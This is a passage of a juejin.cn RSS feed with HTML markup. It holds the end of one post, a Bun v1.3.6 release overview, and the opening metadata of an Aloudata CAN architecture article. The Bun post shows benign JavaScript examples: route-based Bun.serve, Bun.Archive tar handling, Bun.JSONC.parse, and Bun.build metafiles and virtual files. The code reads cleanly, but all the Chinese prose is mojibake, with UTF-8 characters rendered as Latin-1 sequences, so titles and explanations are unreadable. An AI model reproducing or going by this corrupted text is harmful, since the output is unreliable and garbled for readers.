<p>å¦‚æœä½ çš„å›¢é˜Ÿç»å¸¸éœ€è¦æ‰§è¡Œæ¥å£æµ‹è¯•ï¼Œå¸Œæœ›è®©è¿™ä¸ªè¿‡ç¨‹æ›´è‡ªåŠ¨åŒ–ã€æ›´æ™ºèƒ½ï¼Œè¿™å¥—æ–¹æ¡ˆå€¼å¾—ä¸€è¯•ã€‚åˆæœŸéœ€è¦èŠ±æ—¶é—´é…ç½®å’Œç†Ÿæ‚‰ï¼Œä½†ä¸€æ—¦å»ºç«‹èµ·æ¥ï¼Œèƒ½æ˜¾è‘—æå‡å·¥ä½œæ•ˆç‡ã€‚éšç€ä½¿ç”¨æ·±å…¥ï¼Œä½ ä¼šå‘ç°æ›´å¤šå¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹ï¼Œè®©æ•´ä¸ªå·¥ä½œæµè¶Šæ¥è¶Šé¡ºç•…ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Bun v1.3.6å‘å¸ƒï¼Œå†…ç½®tarè§£å‹ç¼©ï¼Œå„æ–¹é¢æé€Ÿåˆæé€Ÿ]]></title>    <link>https://juejin.cn/post/7594765626456342578</link>    <guid>https://juejin.cn/post/7594765626456342578</guid>    <pubDate>2026-01-14T02:02:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594765626456342578" data-draft-id="7594735599314059314" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Bun v1.3.6å‘å¸ƒï¼Œå†…ç½®tarè§£å‹ç¼©ï¼Œå„æ–¹é¢æé€Ÿåˆæé€Ÿ"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2026-01-14T02:02:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ä¹‹è™é™ˆéšæ˜“"/> <meta itemprop="url" content="https://juejin.cn/user/1239904846873326"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Bun v1.3.6å‘å¸ƒï¼Œå†…ç½®tarè§£å‹ç¼©ï¼Œå„æ–¹é¢æé€Ÿåˆæé€Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1239904846873326/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯ä¹‹è™é™ˆéšæ˜“
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T02:02:46.000Z" title="Wed Jan 14 2026 02:02:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å†œæ‘ç¨‹åºå‘˜ï¼Œç‹¬ç«‹å¼€å‘è€…ï¼Œå‰ç«¯ä¹‹è™é™ˆéšæ˜“ï¼ŒæŠ€æœ¯ç¾¤ä¸äº¤æœ‹å‹è¯·åœ¨ä¸ªäººç½‘ç«™ ğŸ‘‡ è”ç³»æˆ‘ âœŒï¸</p>
<ul>
<li>ä¸ªäººç½‘ç«™ 1ï¸âƒ£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fchensuiyi.me" target="_blank" title="https://chensuiyi.me" ref="nofollow noopener noreferrer">chensuiyi.me</a></li>
<li>ä¸ªäººç½‘ç«™ 2ï¸âƒ£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fme.yicode.tech" target="_blank" title="https://me.yicode.tech" ref="nofollow noopener noreferrer">me.yicode.tech</a></li>
</ul>
<p>æˆ‘çš„æ‰€æœ‰æ–‡ç« å‡ä¸ºå¤æ³•æ‰‹å†™ï¼Œæ—  AI æ·»åŠ å‰‚ï¼Œè¯·æ”¾å¿ƒé£Ÿç”¨ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡æœ‰ç”¨ï¼Œä¸€é”®ä¸‰è¿ (<code>ç‚¹èµ</code>ã€<code>è¯„è®º</code>ã€<code>è½¬å‘</code>)ï¼Œå°±æ˜¯å¯¹æˆ‘æœ€å¤§çš„æ”¯æŒ~</p>
<hr/>
<p>All in Bun åŠå¹´äº†ï¼Œä½“éªŒéå¸¸ä¸é”™ï¼Œä»€ä¹ˆå« All in Bun å‘¢ï¼Ÿå°±æ˜¯æˆ‘å·²ç»åŠå¹´æ²¡æœ‰è¿è¡Œè¿‡ nodeï¼Œnpmï¼Œpnpmï¼Œyarnï¼Œnvm è¿™äº›å‘½ä»¤äº†ï¼Œå®Œå…¨å°±æ˜¯ä¸€ä¸ª bun å‘½ä»¤è§£å†³æ‰€æœ‰çš„è¿è¡Œï¼Œå®‰è£…ï¼Œæ›´æ–°ï¼Œå‘åŒ…ç­‰ç­‰é—®é¢˜ã€‚</p>
<p>åˆ†äº«å‡ ä¸ªæˆ‘æœ€å–œæ¬¢çš„ Bun åŠŸèƒ½ï¼š</p>
<p><strong>å†…ç½® Sql å’Œ Redis åŠŸèƒ½</strong></p>
<p>å¦‚æœæˆ‘ä»¬è¦åœ¨ Bun ä¸­ä½¿ç”¨æ•°æ®åº“å’Œç¼“å­˜åŠŸèƒ½ï¼Œä¸ç”¨å®‰è£…ä»€ä¹ˆ<code>node-mysql2</code>ï¼Œä¸ç”¨å®‰è£…ä»€ä¹ˆ<code>better-sqlite3</code>ï¼Œä¸ç”¨å®‰è£…ä»€ä¹ˆ<code>postgres</code>ï¼Œä¸ç”¨å®‰è£…ä»€ä¹ˆ<code>redis</code>æˆ–<code>ioredis</code>ï¼Œç›´æ¥å°±æ˜¯<code>import { sql, redis } from "bun"</code> æ‹¿æ¥å°±ç”¨ï¼Œç®€å•åˆæ–¹ä¾¿ã€‚</p>
<p><strong>å†…ç½®æ‰“åŒ…åŠŸèƒ½</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b242a6aa30e04f77b0d11a1e6822f6eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LmL6JmO6ZmI6ZqP5piT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768960966&amp;x-signature=%2BTHTgsBg77OWkhManiWC3GvsUdo%3D" alt="" loading="lazy"/></p>
<p>ç›´æ¥å¯¹æ ‡ rollupï¼Œwebpackï¼Œesbuildï¼Œrspack ç­‰æ‰“åŒ…å·¥å…·ï¼Œå¼€ç®±å³ç”¨ã€‚</p>
<p>æˆ‘å¾ˆå–œæ¬¢è¿™ä¸ªåŠŸèƒ½ï¼Œå› ä¸ºå®ƒéå¸¸æ–¹ä¾¿å°±èƒ½æŠŠä¸€ä¸ªé¡¹ç›®æ‰“åŒ…ä¸ºä¸€ä¸ª<code>å•æ–‡ä»¶</code>ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d0e366d54564fd7b81554c02e89c6dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LmL6JmO6ZmI6ZqP5piT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768960966&amp;x-signature=qPiYTuaIQd5wLlB%2Be1I6jj9pV9s%3D" alt="" loading="lazy"/></p>
<p>æ¯”å¦‚æˆ‘è‡ªå·±å¼€å‘çš„ä¸º Bun ä¸“å±æ‰“é€ çš„åç«¯æ¥å£æ¡†æ¶ <strong>é‡èœ‚é£èˆ</strong> <code>https://github.com/chenbimo/befly</code>ï¼Œå°±é€šè¿‡ Bun æ‰“åŒ…ä¸ºä¸€ä¸ªå‹ç¼©å 200+kb çš„ js æ–‡ä»¶ï¼Œåªè¦ç®€å•åœ°æ”¾åœ¨é¡¹ç›®ä¸­å°±èƒ½æä¾›å®Œæ•´çš„åç«¯æ¥å£åŠŸèƒ½ï¼Œæ— éœ€å®‰è£… npm åŒ…é‚£ä¸€å¥—ã€‚</p>
<p>ä¸ä»…å¦‚æ­¤ï¼ŒBun è¿˜å¯ä»¥æ‰“åŒ…æ–‡ä»¶ä¸ºå•ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯”å¦‚<code>exe</code>ï¼Œè¿˜èƒ½æŠŠæ•´ä¸ªåç«¯æœåŠ¡å’Œå‰ç«¯é¡µé¢æ‰“åŒ…ä¸ºå•ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç‚¹å‡»æ–‡ä»¶ï¼Œç›´æ¥åœ¨æœ¬åœ°æ‰˜ç®¡ä¸€ä¸ªå®Œæ•´çš„å‰åç«¯é¡¹ç›®ï¼Œéš”å£ Nodejs è¿æ‰“åŒ…<code>exe</code>è¿˜åœ¨æµ‹è¯•é˜¶æ®µï¼Œä¸çŸ¥é“çŒ´å¹´é©¬æœˆæ‰ä¼šå®Œå–„ï¼Œè€Œ Bun å·²ç»é¥é¥é¢†å…ˆã€‚</p>
<p><strong>Http æœåŠ¡åŠŸèƒ½</strong></p>
<p>å†™ Web æœåŠ¡ï¼Œå°±ç®—ä¸ç”¨ä»€ä¹ˆ expressï¼Œkoa æ¡†æ¶ï¼Œä¹Ÿèƒ½ç›´æ¥è·å¾—å¾ˆå¥½çš„å¼€å‘ä½“éªŒï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> server = <span class="hljs-title class_">Bun</span>.<span class="hljs-title function_">serve</span>({
    <span class="hljs-attr">routes</span>: {
        <span class="hljs-comment">// é™æ€è·¯ç”±</span>
        <span class="hljs-string">'/api/status'</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">'OK'</span>),

        <span class="hljs-comment">// åŠ¨æ€è·¯ç”±</span>
        <span class="hljs-string">'/users/:id'</span>: <span class="hljs-function">(<span class="hljs-params">req</span>) =&gt;</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">`Hello User <span class="hljs-subst">${req.params.id}</span>!`</span>);
        },

        <span class="hljs-comment">// åŒä¸€ä¸ªè¯·æ±‚ä¸åŒæ–¹æ³•è¿”å›ä¸åŒå†…å®¹</span>
        <span class="hljs-string">'/api/posts'</span>: {
            <span class="hljs-attr">GET</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">'List posts'</span>),
            <span class="hljs-attr">POST</span>: <span class="hljs-keyword">async</span> (req) =&gt; {
                <span class="hljs-keyword">const</span> body = <span class="hljs-keyword">await</span> req.<span class="hljs-title function_">json</span>();
                <span class="hljs-keyword">return</span> <span class="hljs-title class_">Response</span>.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">created</span>: <span class="hljs-literal">true</span>, ...body });
            }
        },

        <span class="hljs-comment">// æ‰€æœ‰ä»¥/api/å¼€å¤´çš„è·¯ç”±</span>
        <span class="hljs-string">'/api/*'</span>: <span class="hljs-title class_">Response</span>.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'Not found'</span> }, { <span class="hljs-attr">status</span>: <span class="hljs-number">404</span> }),

        <span class="hljs-comment">// é‡å®šå‘</span>
        <span class="hljs-string">'/blog/hello'</span>: <span class="hljs-title class_">Response</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">'/blog/hello/world'</span>),

        <span class="hljs-comment">// åŒ¹é…æ”¶è—å›¾æ ‡</span>
        <span class="hljs-string">'/favicon.ico'</span>: <span class="hljs-title class_">Bun</span>.<span class="hljs-title function_">file</span>(<span class="hljs-string">'./favicon.ico'</span>)
    },

    <span class="hljs-comment">// æ— åŒ¹é…ä¿åº•</span>
    <span class="hljs-title function_">fetch</span>(<span class="hljs-params">req</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-string">'Not Found'</span>, { <span class="hljs-attr">status</span>: <span class="hljs-number">404</span> });
    }
});
</code></pre>
<p>å¦‚æœåœ¨ Nodejs ä¸­ï¼Œå¾—ç”¨<code>find-my-way</code>ä¹‹ç±»çš„è·¯ç”±åŒ…æ¥å®ç°ã€‚</p>
<p>ä¸ä»…äºæ­¤ï¼ŒBun ä¸­å„ç§å¥½ç”¨çš„åŠŸèƒ½å¤ªå¤šäº†ï¼Œä»¥ä¸‹æ˜¯æœ¬æ¬¡<code>Bun v1.3.6</code>æ›´æ–°çš„åŠŸèƒ½ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// è§£å‹taråŒ…</span>
<span class="hljs-keyword">const</span> tarball = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bun</span>.<span class="hljs-title class_">Archive</span>(<span class="hljs-keyword">await</span> <span class="hljs-title class_">Bun</span>.<span class="hljs-title function_">file</span>(<span class="hljs-string">'package.tar.gz'</span>).<span class="hljs-title function_">bytes</span>());
<span class="hljs-keyword">const</span> fileCount = <span class="hljs-keyword">await</span> tarball.<span class="hljs-title function_">extract</span>(<span class="hljs-string">'./output-dir'</span>);

<span class="hljs-comment">// å‹ç¼©taråŒ…</span>
<span class="hljs-keyword">const</span> compressed = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bun</span>.<span class="hljs-title class_">Archive</span>(files, { <span class="hljs-attr">compress</span>: <span class="hljs-string">'gzip'</span> });
</code></pre>
<p>å†…ç½®äº† <code>Bun.Archive</code>æ¥å£ï¼Œå¯ä»¥ç›´æ¥æ›¿ä»£ Nodejs ä¸­è¦ç”¨<code>node-tar</code>åŒ…æ‰èƒ½å®ç°çš„åŠŸèƒ½ï¼Œè€Œä¸”é€Ÿåº¦å¿«äº†<code>4-30</code>å€ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> config = <span class="hljs-title class_">Bun</span>.<span class="hljs-property">JSONC</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">`{
  // Database configuration
  "host": "localhost",
  "port": 5432,
  "options": {
    "ssl": true, // trailing comma allowed
  },
}`</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(config.<span class="hljs-property">host</span>); <span class="hljs-comment">// "localhost"</span>
</code></pre>
<p>å†…ç½®äº†<code>Bun.JSONC.parse()</code> ï¼Œå¯ä»¥è§£æå¸¦æœ‰æ³¨é‡Šçš„ json æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Bun</span>.<span class="hljs-title function_">build</span>({
    <span class="hljs-attr">entrypoints</span>: [<span class="hljs-string">'./src/index.ts'</span>],
    <span class="hljs-attr">outdir</span>: <span class="hljs-string">'./dist'</span>,
    <span class="hljs-attr">metafile</span>: <span class="hljs-literal">true</span>
});

<span class="hljs-comment">// åˆ†ææ‰“åŒ…å¤§å°</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [path, meta] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(result.<span class="hljs-property">metafile</span>.<span class="hljs-property">inputs</span>)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${path}</span>: <span class="hljs-subst">${meta.bytes}</span> bytes`</span>);
}

<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [path, meta] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(result.<span class="hljs-property">metafile</span>.<span class="hljs-property">outputs</span>)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${path}</span>: <span class="hljs-subst">${meta.bytes}</span> bytes`</span>);
}

<span class="hljs-comment">// å†™å…¥åˆ°æœ¬åœ°ï¼Œå¯ä»¥è¢«è¯¸å¦‚esbuildè¿™æ ·çš„æ‰“åŒ…å·¥å…·åˆ†æ</span>
<span class="hljs-keyword">await</span> <span class="hljs-title class_">Bun</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">'./dist/meta.json'</span>, <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(result.<span class="hljs-property">metafile</span>));
</code></pre>
<p>æ‰“åŒ…åŠŸèƒ½æä¾›äº†<code>metafile</code>å±æ€§ï¼Œå¯ä»¥ç”Ÿæˆæ‰“åŒ…å…ƒæ•°æ®ï¼Œç„¶åç”¨å…¶ä»–å·¥å…·ï¼Œå¯ä»¥å¯¹æ‰“åŒ…äº§ç‰©è¿›è¡Œå¯è§†åŒ–æŸ¥çœ‹ï¼Œæä¾›æ›´å¥½çš„åˆ†æä¼˜åŒ–ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Bun</span>.<span class="hljs-title function_">build</span>({
    <span class="hljs-attr">entrypoints</span>: [<span class="hljs-string">'/app/index.ts'</span>],
    <span class="hljs-attr">files</span>: {
        <span class="hljs-string">'/app/index.ts'</span>: <span class="hljs-string">`
      import { greet } from "./greet.ts";
      console.log(greet("World"));
    `</span>,
        <span class="hljs-string">'/app/greet.ts'</span>: <span class="hljs-string">`
      export function greet(name: string) {
        return "Hello, " + name + "!";
      }
    `</span>
    }
});
</code></pre>
<p>å¯ä»¥åœ¨æ‰“åŒ…çš„æ—¶å€™ï¼Œç”¨è™šæ‹Ÿæ–‡ä»¶æ›¿æ¢ç£ç›˜æ–‡ä»¶ï¼Œçµæ´»æ–¹ä¾¿ï¼Œä½†çœŸå®åœºæ™¯æˆ‘è‡ªå·±è¿˜æ²¡æœ‰ç”¨åˆ°ã€‚</p>
<p>å¦å¤–å‘¢ï¼Œå°±æ˜¯é€Ÿåº¦æå‡æ–¹é¢çš„æ›´æ–°ï¼ŒBun åœ¨è¿™æ–¹é¢ä¸€ç›´ä¸é—ä½™åŠ›åœ°ä¼˜åŒ–å’Œå‹æ¦¨ä»£ç æ€§èƒ½ã€‚</p>
<p><code>Response.json()</code>æé€Ÿ<code>3.5å€</code>ï¼Œ<code>async/await</code>æé€Ÿ<code>15%</code>ï¼Œ<code>promise.race()</code>æé€Ÿ<code>30%</code>ï¼Œ<code>Buffer.indexOf()</code>æé€Ÿ<code>2å€</code>ï¼Œæ‰“åŒ…å•ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æœ‰å†…åµŒ<code>.node</code>æ–‡ä»¶æ˜¯æ›´å¿«ï¼Œ<code>JSON IPC</code>ä¼ é€å¤§æ•°æ®æé«˜<code>9å€</code>ï¼Œ<code>Bun.spawnSync()</code>æé€Ÿ<code>30å€</code>ï¼Œæ›´å¿«çš„ JSON åºåˆ—åŒ–ã€‚</p>
<p>æ¯æ¬¡æ›´æ–°ï¼Œå¯¹ Nodejs çš„å…¼å®¹æ€§å°±ä¼šè¿›ä¸€æ­¥æé«˜ï¼Œä¸€äº›å¯èƒ½ä¹‹å‰æ— æ³•è¿è¡Œï¼Œæˆ–è€…è¿è¡Œæœ‰é—®é¢˜çš„é¡¹ç›®ï¼Œå¯ä»¥è¯•ä¸€è¯•ï¼Œè¯´ä¸å®šå°±æ­£å¸¸äº†ã€‚</p>
<p>æˆ‘ä» Bun è¿˜æ²¡æœ‰å‘æ­£å¼ç‰ˆå¼€å§‹ç”¨ï¼Œä¸€æ­¥æ­¥ä½“éªŒåˆ°äº†ä»å®Œå…¨ä¸å¯ç”¨ï¼Œåˆ°ç”¨äº†ä¸€å †æŠ¥é”™ï¼Œåˆ°ç°åœ¨ç¨³å®šè¿è¡Œï¼Œæˆä¸ºè‡ªå·±çš„è¶æ‰‹æ­¦å™¨ï¼Œæ¨èæ¯ä¸ªå†™å‰ç«¯ï¼Œå†™ JS/TS çš„å°ä¼™ä¼´ä»¬éƒ½ä¸Šæ‰‹è¯•è¯•ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å®Œç¾åº”å¯¹åƒäº¿çº§æ˜ç»†æ•°æ®è®¡ç®—ï¼šAloudata CAN åŒå¼•æ“æ¶æ„è¯¦è§£]]></title>    <link>https://juejin.cn/post/7595341943338024970</link>    <guid>https://juejin.cn/post/7595341943338024970</guid>    <pubDate>2026-01-15T07:04:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595341943338024970" data-draft-id="7595341943337910282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å®Œç¾åº”å¯¹åƒäº¿çº§æ˜ç»†æ•°æ®è®¡ç®—ï¼šAloudata CAN åŒå¼•æ“æ¶æ„è¯¦è§£"/> <meta itemprop="keywords" content="æ•°æ®å¯è§†åŒ–,æ•°æ®åˆ†æ,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-15T07:04:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Aloudataå¤§åº”ç§‘æŠ€"/> <meta itemprop="url" content="https://juejin.cn/user/1579340474099927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å®Œç¾åº”å¯¹åƒäº¿çº§æ˜ç»†æ•°æ®è®¡ç®—ï¼šAloudata CAN åŒå¼•æ“æ¶æ„è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1579340474099927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Aloudataå¤§åº”ç§‘æŠ€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T07:04:50.000Z" title="Thu Jan 15 2026 07:04:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
